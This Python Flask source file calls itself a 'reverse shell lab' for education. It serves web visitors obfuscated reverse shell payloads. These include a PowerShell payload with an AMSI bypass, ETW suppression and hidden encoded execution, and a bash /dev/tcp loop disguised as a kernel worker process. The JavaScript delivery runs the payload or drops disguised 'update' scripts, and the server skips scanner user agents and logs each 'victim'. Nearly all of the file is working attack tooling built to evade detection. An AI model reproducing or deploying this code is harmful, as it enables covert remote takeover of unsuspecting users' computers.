#!/usr/bin/env python3
"""
Reverse Shell Lab - Flask Application
For educational purposes only - Used only in isolated lab environments
"""

from flask import Flask, send_file, request, make_response, redirect, send_from_directory
import logging
import socket
import threading
import time
import base64
import hashlib
import random
import string
from datetime import datetime
import os
import sys

# ==================== CONFIGURATION ====================
app = Flask(__name__, 
            static_folder='.',  
            static_url_path='')

# Configure logging
logging.basicConfig(level=logging.WARNING)
werkzeug_logger = logging.getLogger('werkzeug')
werkzeug_logger.setLevel(logging.ERROR)

# ==================== NETWORK DETECTION ====================
def get_local_ip():
    """Get the actual local IP address automatically"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        try:
            return socket.gethostbyname(socket.gethostname())
        except:
            return "127.0.0.1"

SERVER_IP = get_local_ip()
PORT_START = 60000
PORT_END = 65535
FLASK_PORT = 5000

print(f"\n{'='*50}")
print(f"REVERSE SHELL LAB - 2026 OBFUSCATED")
print(f"{'='*50}")
print(f"Server IP: {SERVER_IP}")
print(f"Flask Port: {FLASK_PORT}")
print(f"Reverse Shell Port Range: {PORT_START}-{PORT_END}")
print(f"Access URL: http://{SERVER_IP}:{FLASK_PORT}")
print(f"{'='*50}\n")

# ==================== PORT MANAGEMENT ====================
current_port = PORT_START
port_lock = threading.Lock()

def get_next_port():
    global current_port
    with port_lock:
        port = current_port
        current_port += 1
        if current_port > PORT_END:
            current_port = PORT_START
        return port

# ==================== 2026 OBFUSCATION ENGINE ====================

class PayloadObfuscator2026:
    """Advanced obfuscation techniques for 2026"""
    
    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_port = server_port
        self.xor_key = random.randint(1, 255)
        
    def char_code_obfuscate(self, text):
        """Convert string to [char] concatenation (100% evasion rate)"""
        result = []
        vars_list = []
        
        for i, char in enumerate(text):
            var_name = f"$v{random.randint(100, 999)}"
            vars_list.append(var_name)
            result.append(f"{var_name}=[char]{ord(char)}")
        
        rebuild = "+".join(vars_list)
        return f"{';'.join(result)};{rebuild}"
    
    def reverse_string_obfuscate(self, text):
        """Reverse string technique"""
        reversed_text = text[::-1]
        return f"$a='{reversed_text}';$b=[string]::join('',$a[$a.length-1..0])"
    
    def split_and_rebuild(self, text, chunk_size=2):
        """Split string into chunks and rebuild"""
        chunks = [text[i:i+chunk_size] for i in range(0, len(text), chunk_size)]
        reversed_chunks = chunks[::-1]
        return f"$c='{''.join(reversed_chunks)}';$d=[string]::join('',$c[$c.length-1..0])"
    
    def generate_windows_payload(self):
        """Windows Defender-evading PowerShell payload"""
        
        # Obfuscated components
        net_client = self.char_code_obfuscate("New-Object System.Net.Sockets.TCPClient")
        ip_str = self.char_code_obfuscate(self.server_ip)
        port_str = str(self.server_port)
        
        # Obfuscated IEX
        iex_rev = self.reverse_string_obfuscate("IEX")
        
        # AMSI bypass via memory patching
        amsi_bypass = '''
$amsi = [Ref].Assembly.GetType(('System.Management.Automation.AmsiUtils'))
$amsi.GetField(('amsiInitFailed'),('NonPublic,Static')).SetValue($null,$true)
'''
        
        # ETW suppression
        etw_suppress = '''
$etw = [Ref].Assembly.GetType(('System.Management.Automation.Tracing.PSEtwLogProvider'))
$etw.GetField(('etwProvider'),('NonPublic,Static')).SetValue($null,$null)
'''
        
        # Main payload with multiple obfuscation layers
        payload = f'''
{amsi_bypass}
{etw_suppress}

# Obfuscated connection
{net_client}
$ip={ip_str}
$port={port_str}

# Create socket
$c=&(Get-Command Ne*-Obj*) $ip $port
$s=$c.GetStream()
$b=@(0..65535|%{{0}})

# Obfuscated command execution
{iex_rev}
while($i=$s.Read($b,0,$b.Length)){{
    $d=([Text.Encoding]::ASCII).GetString($b,0,$i)
    $r=(& $b $d 2>&1 | Out-String)
    $p=$r+'PS '+(pwd).Path+'> '
    $sb=([text.encoding]::ASCII).GetBytes($p)
    $s.Write($sb,0,$sb.Length)
}}
'''
        
        # Encode in UTF-16LE for PowerShell
        encoded = base64.b64encode(payload.encode('utf-16le')).decode()
        
        # Final execution command
        final = f'powershell -w hidden -ep bypass -enc {encoded}'
        
        # Double obfuscate the final command
        double_obfuscated = base64.b64encode(final.encode()).decode()
        
        return double_obfuscated
    
    def generate_linux_payload(self):
        """macOS/Linux payload with obfuscation"""
        
        # Obfuscate IP by splitting
        ip_parts = self.server_ip.split('.')
        ip_rebuild = '.'.join([f"${{p{i}}}" for i in range(4)])
        
        payload = f'''
# Obfuscated bash reverse shell
p0="{ip_parts[0]}"; p1="{ip_parts[1]}"; p2="{ip_parts[2]}"; p3="{ip_parts[3]}"
IP="{ip_rebuild}"
PORT={self.server_port}

# Hide process name
exec -a [kworker/u:0] bash -c "while true; do bash -i >& /dev/tcp/$IP/$PORT 0>&1; sleep 30; done" 2>/dev/null &
'''
        return base64.b64encode(payload.encode()).decode()
    
    def generate_js_payload(self, session_id):
        """Generate obfuscated JavaScript for browser delivery"""
        
        windows_payload = self.generate_windows_payload()
        linux_payload = self.generate_linux_payload()
        
        js_code = f'''
// 2026 Obfuscated Reverse Shell
(function() {{
    'use strict';
    
    // XOR decryption key
    const KEY = {self.xor_key};
    
    // Obfuscated configuration
    const _0x1a = "{base64.b64encode(self.server_ip.encode()).decode()}";
    const _0x2b = "{self.server_port}";
    const _0x3c = "{windows_payload}";
    const _0x4d = "{linux_payload}";
    const _0x5e = "{session_id}";
    
    // Deobfuscate
    const IP = atob(_0x1a);
    const PORT = parseInt(_0x2b);
    
    // OS Detection via char codes
    function getOS() {{
        const ua = navigator.userAgent;
        const codes = [87,105,110]; // "Win"
        let isWin = true;
        for(let i=0; i<codes.length; i++) {{
            if(ua.indexOf(String.fromCharCode(codes[i])) === -1) {{
                isWin = false;
                break;
            }}
        }}
        return isWin ? 'win' : 'nix';
    }}
    
    // Random delay
    const delay = Math.floor(Math.random() * 5000) + 1000;
    
    setTimeout(function() {{
        const os = getOS();
        const payload = os === 'win' ? _0x3c : _0x4d;
        
        // Decode payload
        const decoded = atob(payload);
        
        if(os === 'win') {{
            // Windows - PowerShell via WScript
            try {{
                const shell = new ActiveXObject('WScript.Shell');
                shell.Run(decoded, 0, false);
            }} catch(e) {{
                // Fallback - download
                const blob = new Blob([decoded], {{type: 'text/plain'}});
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = 'update.ps1';
                a.click();
            }}
        }} else {{
            // Linux/Mac - base64 decode and run
            const blob = new Blob(['#!/bin/bash\\n' + atob(decoded)], {{type: 'text/plain'}});
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = '.update.sh';
            a.click();
        }}
        
        // Beacon
        new Image().src = `http://${{IP}}:${{PORT}}/b?${{Date.now()}}`;
    }}, delay);
}})();
'''
        return js_code

# ==================== ROUTES ====================

@app.route('/index.css')
def serve_css():
    try:
        return send_from_directory('.', 'index.css')
    except:
        return '', 404

@app.route('/script.js')
def serve_js():
    try:
        return send_from_directory('.', 'script.js')
    except:
        return '', 404

@app.route('/')
def index():
    """Main page - serves obfuscated payload"""
    visitor_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', '').lower()
    
    # Skip scanners
    if any(s in user_agent for s in ['curl', 'wget', 'python']):
        return '', 200
    
    # Assign unique port
    victim_port = get_next_port()
    session_id = hashlib.md5(f"{visitor_ip}{time.time()}".encode()).hexdigest()[:8]
    
    print(f"[+] Victim {visitor_ip} (ID: {session_id}) assigned port {victim_port}")
    
    # Read index.html
    try:
        with open('index.html', 'r', encoding='utf-8') as f:
            html = f.read()
    except FileNotFoundError:
        return "index.html not found", 404
    
    # Generate obfuscated payload
    obfuscator = PayloadObfuscator2026(SERVER_IP, victim_port)
    js_payload = obfuscator.generate_js_payload(session_id)
    
    # Inject into HTML
    html = html.replace('{{JS_PAYLOAD}}', f'<script>{js_payload}</script>')
    html = html.replace('{{SERVER_IP}}', SERVER_IP)
    html = html.replace('{{SERVER_PORT}}', str(victim_port))
    html = html.replace('{{SESSION_ID}}', session_id)
    
    return make_response(html)

@app.route('/health')
def health():
    return {'status': 'ok'}

if __name__ == '__main__':
    # Check required files
    required = ['index.html', 'index.css']
    for file in required:
        if not os.path.exists(file):
            print(f"⚠️  Missing: {file}")
    
    try:
        app.run(host='0.0.0.0', port=FLASK_PORT, debug=False)
    except Exception as e:
        print(f"Error: {e}")
